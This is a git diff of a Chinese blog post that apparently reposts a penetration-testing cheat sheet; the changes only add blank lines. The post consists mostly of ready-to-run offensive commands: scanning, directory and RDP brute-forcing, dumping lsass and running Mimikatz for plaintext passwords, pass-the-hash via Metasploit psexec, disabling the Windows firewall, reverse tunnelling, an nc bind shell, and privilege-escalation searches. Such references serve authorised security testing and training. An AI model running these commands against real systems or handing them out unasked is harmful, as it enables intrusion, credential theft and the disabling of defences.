@@ -10,6 +10,7 @@ tags:
 excerpt: 对一些渗透测试工具实战技巧的总结，转载。
 
 ---
+
 # 最好的 NMAP 扫描策略
 		
 ###  适用所有大小网络最好的 nmap 扫描策略
@@ -75,12 +76,14 @@ excerpt: 对一些渗透测试工具实战技巧的总结，转载。
 	nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
 
 -----
+
 # 使用 DIRB 爆破目录
 注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。
 
 	dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
  
 -----
+
 # Patator – 全能暴力破解测试工具
 	# git clone https://github.com/lanjelot/patator.git /usr/share/patator
 
@@ -105,17 +108,20 @@ excerpt: 对一些渗透测试工具实战技巧的总结，转载。
 	nikto -C all -h http://IP
 
 -----
+
 # 扫描 WordPress
 	git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
 	./wpscan –url http://IP/ –enumerate p
 
 -----
+
 # HTTP 指纹识别
 wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
 cd httprint_301/linux/
 ./httprint -h http://IP -s signatures.txt
 
 ------
+
 # 使用 Skipfish 扫描
 注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。
 
@@ -123,11 +129,13 @@ cd httprint_301/linux/
 
 
 ----
+
 # 使用 NC 扫描
 	nc -v -w 1 target -z 1-1000
 for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 
 -----
+
 # Unicornscan
 注：Unicornscan 是一个信息收集和安全审计的工具。
 
@@ -139,11 +147,13 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	-Iv - 详细
 
 ----
+
 # 使用 Xprobe2 识别操作系统指纹
 
 	xprobe2 -v -p tcp:80:open IP
 
 -----
+
 # 枚举 Samba
 	
 	nmblookup -A target
@@ -152,12 +162,15 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	enum4linux target
 
 ----
+
 # 枚举 SNMP
 
 	snmpget -v 1 -c public IP
 	snmpwalk -v 1 -c public IP
 	snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+	
 -----
+
 # 实用的 Windows cmd 命令
 
 	net localgroup Users
@@ -173,11 +186,14 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	C:/temp/procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统
 
 ----
+
 # PuTTY 连接隧道
 转发远程端口到目标地址
 	
 	plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
+	
 ---
+
 # Meterpreter 端口转发
 	# https://www.offensive-security.com/metasploit-unleashed/portfwd/
 	# 转发远程端口到目标地址
@@ -189,17 +205,20 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	netsh firewall set service remotedesktop enable
 
 -----
+
 # 关闭 Windows 防火墙
 
 	netsh firewall set opmode disable
 
 ----
+
 # Meterpreter VNC/RDP
 	# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
 	run getgui -u admin -p 1234
 	run vnc -p 5043
 
 ----
+
 # 使用 Mimikatz
 获取 Windows 明文用户名密码
 
@@ -224,12 +243,15 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
 	msf exploit(psexec) > exploit
 	meterpreter > shell
+	
 -----
+
 # 使用 Hashcat 破解密码
 
 	hashcat -m 400 -a 0 hash /root/rockyou.txt
 
 ----
+
 # 使用 NC 抓取 Banner 信息
 	nc 192.168.0.10 80
 	GET / HTTP/1.1
@@ -247,7 +269,9 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 	nc -lp 31337 -e /bin/bash
 	nc 192.168.0.10 31337
 	nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+	
 ----
+
 # 查找 SUID/SGID root 文件
 	# 查找 SUID root 文件
 	find / -user root -perm -4000 -print
@@ -267,14 +291,18 @@ for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
 # 查找软连接及其指向:
 
 	find / -type l -ls
+	
 ----
+
 # Python shell
 	python -c 'import pty;pty.spawn("/bin/bash")'
 	Python/Ruby/PHP HTTP 服务器
 	python2 -m SimpleHTTPServer
 	python3 -m http.server
 	ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :D ocumentRoot => Dir.pwd).start"
+	
 ---
+
 # php -S 0.0.0.0:8888
 获取进程对应的 PID
 fuser -nv tcp 80
@@ -282,6 +310,7 @@ fuser -k -n tcp 80
 
 
 -----
+
 # 使用 Hydra 爆破 RDP
 hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
 
